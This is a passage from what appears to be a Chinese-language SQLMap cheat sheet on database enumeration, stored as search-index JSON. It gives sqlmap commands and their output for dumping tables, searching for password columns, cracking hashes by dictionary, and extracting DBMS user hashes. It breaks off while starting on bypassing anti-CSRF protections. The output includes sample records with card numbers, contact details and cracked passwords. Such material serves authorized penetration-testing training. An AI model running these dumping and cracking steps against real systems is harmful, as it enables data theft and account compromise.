2.2.9\nback-end DBMS: MySQL &gt;= 5.0\nbanner: '5.1.41-3~bpo50+1'\n[13:30:58] [INFO] fetching current user\ncurrent user: 'root@%'\n[13:30:58] [INFO] fetching current database\ncurrent database: 'testdb'\n[13:30:58] [INFO] testing if current user is DBA\n[13:30:58] [INFO] fetching current user\ncurrent user is DBA: True\n[13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'\n\n[*] ending @ 13:30:58 /2020-09-17/\n</code></pre> <p>\u4ece\u4e0a\u9762\u7684\u4f8b\u5b50\u53ef\u4ee5\u770b\u51fa\uff0c\u6570\u636e\u5e93\u7248\u672c\u6bd4\u8f83\u65e7\uff08MySQL 5.1.41 - 2009\u5e7411\u6708\uff09\uff0c<code>\u5f53\u524d\u7528\u6237\u540d\u4e3aroot</code>\uff0c\u5f53\u524d\u6570\u636e\u5e93\u540d\u4e3a <code>testdb</code>\u3002</p> <p>\u6ce8\u610f\uff1a\u5728\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6570\u636e\u5e93\u4e0a\u4e0b\u6587\u4e2d\u7684\u201croot\u201d\u7528\u6237\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u7528\u6237\u201croot\u201d\u6ca1\u6709\u4efb\u4f55\u5173\u7cfb\uff0c\u9664\u4e86\u4ee3\u8868 DBMS \u4e0a\u4e0b\u6587\u4e2d\u7684\u7279\u6743\u7528\u6237\u3002\u8fd9\u57fa\u672c\u4e0a\u610f\u5473\u7740\u6570\u636e\u5e93\u7528\u6237\u4e0d\u5e94\u8be5\u5728\u6570\u636e\u5e93\u4e0a\u4e0b\u6587\u4e2d\u6709\u4efb\u4f55\u9650\u5236\uff0c\u800c\u64cd\u4f5c\u7cfb\u7edf\u6743\u9650\uff08\u4f8b\u5982\u6587\u4ef6\u7cfb\u7edf\u5199\u5165\u4efb\u610f\u4f4d\u7f6e\uff09\u5e94\u8be5\u662f\u6700\u5c0f\u7684\uff0c\u81f3\u5c11\u5728\u6700\u8fd1\u7684\u90e8\u7f72\u4e2d\u662f\u8fd9\u6837\u3002\u540c\u6837\u7684\u539f\u5219\u9002\u7528\u4e8e\u901a\u7528\u7684\u201cDBA\u201d\u89d2\u8272\u3002</p>"},{"location":"CheetSheet/SQLMAP/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE/#_2","title":"\u8868\u679a\u4e3e","text":"<p>\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u5728\u627e\u5230\u5f53\u524d\u6570\u636e\u5e93\u540d\u79f0\uff08\u5373 <code>testdb</code>\uff09\u540e\uff0c\u5c06\u901a\u8fc7\u4f7f\u7528 <code>--tables</code> \u9009\u9879\u5e76\u4f7f\u7528 <code>-D testdb</code> \u6307\u5b9a\u6570\u636e\u5e93\u540d\u79f0\u6765\u68c0\u7d22\u8868\u540d\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --tables -D testdb\n\n...SNIP...\n[13:59:24] [INFO] fetching tables for database: 'testdb'\nDatabase: testdb\n[4 tables]\n+---------------+\n| member        |\n| data          |\n| international |\n| users         |\n+---------------+\n</code></pre> <p>\u53d1\u73b0\u611f\u5174\u8da3\u7684\u8868\u540d\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 <code>--dump</code> \u9009\u9879\u5e76\u4f7f\u7528 <code>-T user</code> \u6307\u5b9a\u8868\u540d\u6765\u68c0\u7d22\u5176\u5185\u5bb9\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb\n\n...SNIP...\nDatabase: testdb\n\nTable: users\n[4 entries]\n+----+--------+------------+\n| id | name   | surname    |\n+----+--------+------------+\n| 1  | luther | blisset    |\n| 2  | fluffy | bunny      |\n| 3  | wu     | ming       |\n| 4  | NULL   | nameisnull |\n+----+--------+------------+\n\n[14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'\n</code></pre> <p>\u63a7\u5236\u53f0\u8f93\u51fa\u663e\u793a\u8be5\u8868\u4ee5\u683c\u5f0f\u5316\u7684 CSV \u683c\u5f0f\u8f6c\u50a8\u5230\u672c\u5730\u6587\u4ef6 <code>users.csv</code>\u3002</p> <p>\u63d0\u793a\uff1a\u9664\u4e86\u9ed8\u8ba4\u7684 CSV \u4e4b\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9009\u9879 <code>--dump-format</code> \u5c06\u8f93\u51fa\u683c\u5f0f\u6307\u5b9a\u4e3a HTML \u6216 SQLite\uff0c\u4ee5\u4fbf\u6211\u4eec\u7a0d\u540e\u53ef\u4ee5\u5728 SQLite \u73af\u5883\u4e2d\u8fdb\u4e00\u6b65\u8c03\u67e5\u6570\u636e\u5e93\u3002</p>"},{"location":"CheetSheet/SQLMAP/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE/#_3","title":"\u8868/\u884c\u679a\u4e3e","text":"<p>\u5728\u5904\u7406\u5177\u6709\u8bb8\u591a\u5217 \u548c/\u6216 \u884c\u7684\u5927\u578b\u8868\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>-C</code> \u9009\u9879\u6307\u5b9a\u5217\uff08\u4f8b\u5982\uff0c\u4ec5 <code>name</code> \u548c <code>surname</code> \u5217\uff09\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb -C name,surname\n\n...SNIP...\nDatabase: testdb\n\nTable: users\n[4 entries]\n+--------+------------+\n| name   | surname    |\n+--------+------------+\n| luther | blisset    |\n| fluffy | bunny      |\n| wu     | ming       |\n| NULL   | nameisnull |\n+--------+------------+\n</code></pre> <p>\u8981\u6839\u636e\u8868\u5185\u7684\u5e8f\u53f7\u7f29\u5c0f\u884c\u7684\u8303\u56f4\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>--start</code> \u548c <code>--stop</code> \u9009\u9879\u6307\u5b9a\u884c\uff08\u4f8b\u5982\uff0c\u4ece\u7b2c 2 \u4e2a\u6761\u76ee\u5f00\u59cb\u5230\u7b2c 3 \u4e2a\u6761\u76ee\uff09\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb --start=2 --stop=3\n\n...SNIP...\nDatabase: testdb\n\nTable: users\n[2 entries]\n+----+--------+---------+\n| id | name   | surname |\n+----+--------+---------+\n| 2  | fluffy | bunny   |\n| 3  | wu     | ming    |\n+----+--------+---------+\n</code></pre>"},{"location":"CheetSheet/SQLMAP/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE/#conditional","title":"\u6761\u4ef6(Conditional)\u679a\u4e3e","text":"<p>\u5982\u679c\u9700\u8981\u6839\u636e\u5df2\u77e5\u7684 <code>WHERE</code> \u6761\u4ef6\uff08\u4f8b\u5982 <code>name LIKE 'f%'</code>\uff09\u68c0\u7d22\u67d0\u4e9b\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9009\u9879 <code>--where</code>\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb --where=\"name LIKE 'f%'\"\n\n...SNIP...\nDatabase: testdb\n\nTable: users\n[1 entry]\n+----+--------+---------+\n| id | name   | surname |\n+----+--------+---------+\n| 2  | fluffy | bunny   |\n+----+--------+---------+\n</code></pre>"},{"location":"CheetSheet/SQLMAP/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE/#_4","title":"\u5b8c\u6574\u7684\u6570\u636e\u5e93\u679a\u4e3e","text":"<p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5b8c\u5168\u8df3\u8fc7\u9009\u9879 <code>-T</code> \u7684\u4f7f\u7528\uff08\u4f8b\u5982 <code>--dump -D testdb</code>\uff09\u6765\u68c0\u7d22\u611f\u5174\u8da3\u7684\u6570\u636e\u5e93\u4e2d\u7684\u6240\u6709\u8868\uff0c\u800c\u4e0d\u662f\u6309\u5355\u4e2a\u8868\u68c0\u7d22\u5185\u5bb9\u3002\u901a\u8fc7\u7b80\u5355\u5730\u4f7f\u7528switch(\u5f00\u5173) <code>--dump</code> \u800c\u65e0\u9700\u4f7f\u7528 <code>-T</code> \u6307\u5b9a\u8868\uff0c\u5c06\u68c0\u7d22\u6240\u6709\u5f53\u524d\u6570\u636e\u5e93\u5185\u5bb9\u3002\u81f3\u4e8e <code>--dump-all</code> \u5f00\u5173\uff0c\u5c06\u68c0\u7d22\u6240\u6709\u6570\u636e\u5e93\u4e2d\u7684\u6240\u6709\u5185\u5bb9\u3002</p> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8fd8\u5efa\u8bae\u7528\u6237\u5305\u542b\u5f00\u5173 <code>--exclude-sysdbs</code>\uff08\u4f8b\u5982 <code>--dump-all --exclude-sysdbs</code>\uff09\uff0c\u8fd9\u5c06\u6307\u793a SQLMap \u8df3\u8fc7\u4ece\u7cfb\u7edf\u6570\u636e\u5e93\u68c0\u7d22\u5185\u5bb9\uff0c\u56e0\u4e3a\u5b83\u901a\u5e38\u662f\u6e17\u900f\u6d4b\u8bd5\u8005\u5174\u8da3\u4e0d\u5927\u3002</p>"},{"location":"CheetSheet/SQLMAP/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE/#advanced-database-enumeration","title":"Advanced Database Enumeration","text":"<p>\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u4f7f\u7528 SQLMap \u8fdb\u884c\u6570\u636e\u5e93\u679a\u4e3e\u7684\u57fa\u7840\u77e5\u8bc6\uff0c\u6211\u4eec\u5c06\u5728\u672c\u8282\u4e2d\u4ecb\u7ecd\u66f4\u9ad8\u7ea7\u7684\u6280\u672f\u6765\u679a\u4e3e\u611f\u5174\u8da3\u7684\u6570\u636e\u3002</p>"},{"location":"CheetSheet/SQLMAP/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE/#db-schema-enumeration","title":"DB Schema Enumeration","text":"<p>\u5982\u679c\u6211\u4eec\u60f3\u8981\u68c0\u7d22\u6240\u6709\u8868\u7684\u7ed3\u6784\u4ee5\u4fbf\u6211\u4eec\u53ef\u4ee5\u5168\u9762\u4e86\u89e3\u6570\u636e\u5e93\u4f53\u7cfb\u7ed3\u6784\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5f00\u5173 <code>--schema</code>\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --schema\n\n...SNIP...\nDatabase: master\nTable: log\n[3 columns]\n+--------+--------------+\n| Column | Type         |\n+--------+--------------+\n| date   | datetime     |\n| agent  | varchar(512) |\n| id     | int(11)      |\n+--------+--------------+\n\nDatabase: owasp10\nTable: accounts\n[4 columns]\n+-------------+---------+\n| Column      | Type    |\n+-------------+---------+\n| cid         | int(11) |\n| mysignature | text    |\n| password    | text    |\n| username    | text    |\n+-------------+---------+\n...\nDatabase: testdb\nTable: data\n[2 columns]\n+---------+---------+\n| Column  | Type    |\n+---------+---------+\n| content | blob    |\n| id      | int(11) |\n+---------+---------+\n\nDatabase: testdb\nTable: users\n[3 columns]\n+---------+---------------+\n| Column  | Type          |\n+---------+---------------+\n| id      | int(11)       |\n| name    | varchar(500)  |\n| surname | varchar(1000) |\n+---------+---------------+\n</code></pre>"},{"location":"CheetSheet/SQLMAP/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE/#_5","title":"\u641c\u7d22\u6570\u636e","text":"<p>\u5728\u5904\u7406\u5177\u6709\u5927\u91cf\u8868\u548c\u5217\u7684\u590d\u6742\u6570\u636e\u5e93\u7ed3\u6784\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>--search</code> \u9009\u9879\u641c\u7d22\u611f\u5174\u8da3\u7684\u6570\u636e\u5e93\u3001\u8868\u548c\u5217\u3002\u6b64\u9009\u9879\u4f7f\u6211\u4eec\u80fd\u591f\u4f7f\u7528 <code>LIKE</code> \u8fd0\u7b97\u7b26\u641c\u7d22\u6807\u8bc6\u7b26\u540d\u79f0\u3002\u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u8981\u67e5\u627e\u6240\u6709\u5305\u542b\u5173\u952e\u5b57 <code>user</code> \u7684\u8868\u540d\uff0c\u6211\u4eec\u53ef\u4ee5\u6309\u5982\u4e0b\u65b9\u5f0f\u8fd0\u884c SQLMap\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --search -T user\n\n...SNIP...\n[14:24:19] [INFO] searching tables LIKE 'user'\nDatabase: testdb\n[1 table]\n+-----------------+\n| users           |\n+-----------------+\n\nDatabase: master\n[1 table]\n+-----------------+\n| users           |\n+-----------------+\n\nDatabase: information_schema\n[1 table]\n+-----------------+\n| USER_PRIVILEGES |\n+-----------------+\n\nDatabase: mysql\n[1 table]\n+-----------------+\n| user            |\n+-----------------+\n\ndo you want to dump found table(s) entries? [Y/n] \n...SNIP...\n</code></pre> <p>\u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8fd9\u4e9b\u641c\u7d22\u7ed3\u679c\u7acb\u5373\u53d1\u73b0\u51e0\u4e2a\u6709\u8da3\u7684\u6570\u636e\u68c0\u7d22\u76ee\u6807\u3002\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u6839\u636e\u7279\u5b9a\u5173\u952e\u5b57\uff08\u4f8b\u5982 <code>pass</code>\uff09\u641c\u7d22\u6240\u6709\u5217\u540d\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --search -C pass\n\n...SNIP...\ncolumns LIKE 'pass' were found in the following databases:\nDatabase: owasp10\nTable: accounts\n[1 column]\n+----------+------+\n| Column   | Type |\n+----------+------+\n| password | text |\n+----------+------+\n\nDatabase: master\nTable: users\n[1 column]\n+----------+--------------+\n| Column   | Type         |\n+----------+--------------+\n| password | varchar(512) |\n+----------+--------------+\n\nDatabase: mysql\nTable: user\n[1 column]\n+----------+----------+\n| Column   | Type     |\n+----------+----------+\n| Password | char(41) |\n+----------+----------+\n\nDatabase: mysql\nTable: servers\n[1 column]\n+----------+----------+\n| Column   | Type     |\n+----------+----------+\n| Password | char(64) |\n+----------+----------+\n</code></pre>"},{"location":"CheetSheet/SQLMAP/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE/#_6","title":"\u5bc6\u7801\u679a\u4e3e\u4e0e\u7834\u89e3","text":"<p>\u4e00\u65e6\u6211\u4eec\u8bc6\u522b\u51fa\u5305\u542b\u5bc6\u7801\u7684\u8868\uff08\u4f8b\u5982 <code>master.users</code>\uff09\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528 <code>-T</code> \u9009\u9879\u68c0\u7d22\u8be5\u8868\uff0c\u5982\u524d\u6240\u793a\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --dump -D master -T users\n\n...SNIP...\n[14:31:41] [INFO] fetching columns for table 'users' in database 'master'\n[14:31:41] [INFO] fetching entries for table 'users' in database 'master'\n[14:31:41] [INFO] recognized possible password hashes in column 'password'\ndo you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N\n\ndo you want to crack them via a dictionary-based attack? [Y/n/q] Y\n\n[14:31:41] [INFO] using hash method 'sha1_generic_passwd'\nwhat dictionary do you want to use?\n[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)\n[2] custom dictionary file\n[3] file with list of dictionary files\n&gt; 1\n[14:31:41] [INFO] using default dictionary\ndo you want to use common password suffixes? (slow!) [y/N] N\n\n[14:31:41] [INFO] starting dictionary-based cracking (sha1_generic_passwd)\n[14:31:41] [INFO] starting 8 processes \n[14:31:41] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'                                                                                                         \n[14:31:41] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'                                                                                                         \n...SNIP...\n[14:31:47] [INFO] cracked password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'                                                                                                        \nDatabase: master                                                                                                                                                                                          \nTable: users\n[32 entries]\n+----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+\n| id | cc               | name              | email                       | phone        | address                | birthday          | password                                                    | occupation                                        |\n+----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+\n| 1  | 5387278172507117 | Maynard Rice      | MaynardMRice@yahoo.com      | 281-559-0172 | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             | Linemen                                           |\n| 2  | 4539475107874477 | Julio Thomas      | JulioWThomas@gmail.com      | 973-426-5961 | 1207 Granville Lane    | February 14 1972  | 10945aa229a6d569f226976b22ea0e900a1fc219 (taqris)           | Agricultural product sorter                       |\n| 3  | 4716522746974567 | Kenneth Maloney   | KennethTMaloney@gmail.com   | 954-617-0424 | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         | General and operations manager                    |\n| 4  | 4929811432072262 | Gregory Stumbaugh | GregoryBStumbaugh@yahoo.com | 410-680-5653 | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) | Foreign language interpreter                      |\n| 5  | 4539646911423277 | Bobby Granger     | BobbyJGranger@gmail.com     | 212-696-1812 | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         | Medical records and health information technician |\n| 6  | 5143241665092174 | Kimberly Wright   | KimberlyMWright@gmail.com   | 440-232-3739 | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |\n| 7  | 5503989023993848 | Dean Harper       | DeanLHarper@yahoo.com       | 440-847-8376 | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           | Store detective                                   |\n| 8  | 4556586478396094 | Gabriela Waite    | GabrielaRWaite@msn.com      | 732-638-1529 | 2459 Webster Street    | December 24 1965  | f5eb0fbdd88524f45c7c67d240a191163a27184b (ssival47)         | Telephone station installer                       |\n</code></pre> <p>\u5728\u524d\u9762\u7684\u4f8b\u5b50\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0cSQLMap\u5177\u6709\u81ea\u52a8\u5bc6\u7801\u54c8\u5e0c\u7834\u89e3\u7684\u80fd\u529b\u3002\u5728\u68c0\u7d22\u5230\u7c7b\u4f3c\u4e8e\u5df2\u77e5\u54c8\u5e0c\u683c\u5f0f\u7684\u4efb\u4f55\u503c\u65f6\uff0cSQLMap \u4f1a\u63d0\u793a\u6211\u4eec\u5bf9\u627e\u5230\u7684\u54c8\u5e0c\u6267\u884c\u57fa\u4e8e\u5b57\u5178\u7684\u653b\u51fb\u3002</p> <p>\u54c8\u5e0c\u7834\u89e3\u653b\u51fb\u662f\u6839\u636e\u7528\u6237\u8ba1\u7b97\u673a\u4e0a\u53ef\u7528\u7684\u5185\u6838\u6570\u91cf\uff0c\u4ee5\u591a\u5904\u7406\u65b9\u5f0f\u6267\u884c\u7684\u3002\u76ee\u524d\uff0c\u5b9e\u73b0\u4e86\u5bf9\u7834\u89e3 31 \u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u54c8\u5e0c\u7b97\u6cd5\u7684\u652f\u6301\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u5305\u542b 140 \u4e07\u4e2a\u6761\u76ee\u7684\u5b57\u5178\uff08\u591a\u5e74\u6765\u7f16\u8bd1\uff0c\u6700\u5e38\u89c1\u7684\u6761\u76ee\u51fa\u73b0\u5728\u516c\u5f00\u53ef\u7528\u7684\u5bc6\u7801\u6cc4\u6f0f\u4e2d\uff09\u3002\u56e0\u6b64\uff0c\u5982\u679c\u5bc6\u7801\u54c8\u5e0c\u4e0d\u662f\u968f\u673a\u9009\u62e9\u7684\uff0cSQLMap \u5f88\u6709\u53ef\u80fd\u4f1a\u81ea\u52a8\u7834\u89e3\u5b83\u3002</p>"},{"location":"CheetSheet/SQLMAP/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE/#_7","title":"\u6570\u636e\u5e93\u7528\u6237\u5bc6\u7801\u679a\u4e3e\u4e0e\u7834\u89e3","text":"<p>\u9664\u4e86\u5728\u6570\u636e\u5e93\u8868\u4e2d\u627e\u5230\u7684\u7528\u6237\u51ed\u636e\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5c1d\u8bd5\u8f6c\u50a8\u5305\u542b\u7279\u5b9a\u4e8e\u6570\u636e\u5e93\u7684\u51ed\u636e\uff08\u4f8b\u5982\uff0c\u8fde\u63a5\u51ed\u636e\uff09\u7684\u7cfb\u7edf\u8868\u7684\u5185\u5bb9\u3002\u4e3a\u4e86\u7b80\u5316\u6574\u4e2a\u8fc7\u7a0b\uff0cSQLMap \u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u5f00\u5173 <code>--passwords</code> \u4e13\u95e8\u4e3a\u8fd9\u6837\u7684\u4efb\u52a1\u8bbe\u8ba1\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --passwords --batch\n\n...SNIP...\n[14:25:20] [INFO] fetching database users password hashes\n[14:25:20] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique\n[14:25:20] [INFO] retrieved: 'root'\n[14:25:20] [INFO] retrieved: 'root'\n[14:25:20] [INFO] retrieved: 'root'\n[14:25:20] [INFO] retrieved: 'debian-sys-maint'\ndo you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N\n\ndo you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y\n\n[14:25:20] [INFO] using hash method 'mysql_passwd'\nwhat dictionary do you want to use?\n[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)\n[2] custom dictionary file\n[3] file with list of dictionary files\n&gt; 1\n[14:25:20] [INFO] using default dictionary\ndo you want to use common password suffixes? (slow!) [y/N] N\n\n[14:25:20] [INFO] starting dictionary-based cracking (mysql_passwd)\n[14:25:20] [INFO] starting 8 processes \n[14:25:26] [INFO] cracked password 'testpass' for user 'root'\ndatabase management system users password hashes:\n\n[*] debian-sys-maint [1]:\n    password hash: *6B2C58EABD91C1776DA223B088B601604F898847\n[*] root [1]:\n    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29\n    clear-text password: testpass\n\n[14:25:28] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'\n\n[*] ending @ 14:25:28 /2020-09-18/\n</code></pre> <p>\u63d0\u793a\uff1a\u201c--all\u201d\u5f00\u5173\u4e0e\u201c--batch\u201d\u5f00\u5173\u7ed3\u5408\u4f7f\u7528\uff0c\u5c06\u81ea\u52a8\u5bf9\u76ee\u6807\u672c\u8eab\u6267\u884c\u6574\u4e2a\u679a\u4e3e\u8fc7\u7a0b\uff0c\u5e76\u63d0\u4f9b\u6574\u4e2a\u679a\u4e3e\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>\u8fd9\u57fa\u672c\u4e0a\u610f\u5473\u7740\u5c06\u68c0\u7d22\u6240\u6709\u53ef\u8bbf\u95ee\u7684\u5185\u5bb9\uff0c\u5e76\u53ef\u80fd\u8fd0\u884c\u5f88\u957f\u65f6\u95f4\u3002\u6211\u4eec\u9700\u8981\u624b\u52a8\u5728\u8f93\u51fa\u6587\u4ef6\u4e2d\u627e\u5230\u611f\u5174\u8da3\u7684\u6570\u636e\u3002</p>"},{"location":"CheetSheet/SQLMAP/6%E3%80%81%E7%BB%95%E8%BF%87%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4/","title":"6\u3001\u7ed5\u8fc7 Web \u5e94\u7528\u7a0b\u5e8f\u4fdd\u62a4","text":"<p>\u5728\u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u76ee\u6807\u7aef\u4e0d\u4f1a\u90e8\u7f72\u4efb\u4f55\u4fdd\u62a4\u63aa\u65bd\uff0c\u56e0\u6b64\u4e0d\u4f1a\u963b\u6b62\u81ea\u52a8\u5229\u7528\u3002\u5426\u5219\uff0c\u5728\u9488\u5bf9\u6b64\u7c7b\u76ee\u6807\u8fd0\u884c\u4efb\u4f55\u7c7b\u578b\u7684\u81ea\u52a8\u5316\u5de5\u5177\u65f6\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u9047\u5230\u95ee\u9898\u3002\u5c3d\u7ba1\u5982\u6b64\uff0cSQLMap \u4e2d\u52a0\u5165\u4e86\u5f88\u591a\u673a\u5236\uff0c\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u6210\u529f\u7ed5\u8fc7\u8fd9\u79cd\u4fdd\u62a4\u3002</p>"},{"location":"CheetSheet/SQLMAP/6%E3%80%81%E7%BB%95%E8%BF%87%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4/#anti-csrf","title":"Anti-CSRF \u4ee4\u724c\u7ed5\u8fc7","text":"<p>\u9632\u6b62\u4f7f\u7528\u81ea\u52a8\u5316\u5de5\u5177\u7684\u7b2c\u4e00\u9053\u9632\u7ebf\u4e4b\u4e00\u662f\u5c06 Anti-CSRF\uff08\u5373\u8de8\u7ad9\u70b9\u8bf7\u6c42\u4f2a\u9020\uff09\u4ee4\u724c\u5408\u5e76\u5230\u6240\u6709 HTTP \u8bf7\u6c42\u4e2d\uff0c\u5c24\u5176\u662f\u90a3\u4e9b\u56e0 Web \u8868\u5355\u586b\u5199\u800c\u751f\u6210\u7684\u8bf7\u6c42\u3002</p> <p>\u7528\u6700\u57fa\u672c\u7684\u672f\u8bed\u6765\u8bf4\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7684\u6bcf\u4e2a HTTP \u8bf7\u6c42\u90fd\u5e94\u8be5\u6709\u4e00\u4e2a\uff08\u6709\u6548\u7684\uff09\u4ee4\u724c\u503c\uff0c\u53ea\u6709\u5f53\u7528\u6237\u5b9e\u9645\u8bbf\u95ee\u548c\u4f7f\u7528\u8be5\u9875\u9762\u65f6\u624d\u53ef\u7528\u3002\u867d\u7136\u6700\u521d\u7684\u60f3\u6cd5\u662f\u9632\u6b62\u51fa\u73b0\u5e26\u6709\u6076\u610f\u94fe\u63a5\u7684\u60c5\u51b5\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4ec5\u6253\u5f00\u8fd9\u4e9b\u94fe\u63a5\u4f1a\u5bf9\u4e0d\u77e5\u60c5\u7684\u767b\u5f55\u7528\u6237\u4ea7\u751f\u4e0d\u826f\u540e\u679c\uff08\u4f8b\u5982\uff0c\u6253\u5f00\u7ba1\u7406\u5458\u9875\u9762\u5e76\u6dfb\u52a0\u5177\u6709\u9884\u5b9a\u4e49\u51ed\u636e\u7684\u65b0\u7528\u6237\uff09\uff0c\u4f46\u6b64\u5b89\u5168\u529f\u80fd\u4e5f\u65e0\u610f\u4e2d\u5f3a\u5316\u4e86\u9488\u5bf9\uff08\u4e0d\u9700\u8981\u7684\uff09\u81ea\u52a8\u5316\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u7136\u800c\uff0cSQLMap \u6709\u4e00\u4e9b\u9009\u9879\u53ef\u4ee5\u5e2e\u52a9\u7ed5\u8fc7\u53cd CSRF \u4fdd\u62a4\u3002\u5373\uff0c\u6700\u91cd\u8981\u7684\u9009\u9879\u662f <code>--csrf-token</code>\u3002\u901a\u8fc7\u6307\u5b9a\u4ee4\u724c\u53c2\u6570\u540d\u79f0\uff08\u5b83\u5e94\u8be5\u5df2\u7ecf\u5728\u63d0\u4f9b\u7684\u8bf7\u6c42\u6570\u636e\u4e2d\u53ef\u7528\uff09\uff0cSQLMap \u5c06\u81ea\u52a8\u5c1d\u8bd5\u89e3\u6790\u76ee\u6807\u54cd\u5e94\u5185\u5bb9\u5e76\u641c\u7d22\u65b0\u7684\u4ee4\u724c\u503c\uff0c\u4ee5\u4fbf\u5b83\u53ef\u4ee5\u5728\u4e0b\u4e00\u4e2a\u8bf7\u6c42\u4e2d\u4f7f\u7528\u5b83\u4eec\u3002</p> <p>\u6b64\u5916\uff0c\u5373\u4f7f\u5728\u7528\u6237\u672a\u901a\u8fc7 <code>--csrf-token</code> \u660e\u786e\u6307\u5b9a\u4ee4\u724c\u540d\u79f0\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u63d0\u4f9b\u7684\u53c2\u6570\u4e4b\u4e00\u5305\u542b\u4efb\u4f55\u5e38\u89c1\u7684\u4e2d\u7f00\uff08\u5373 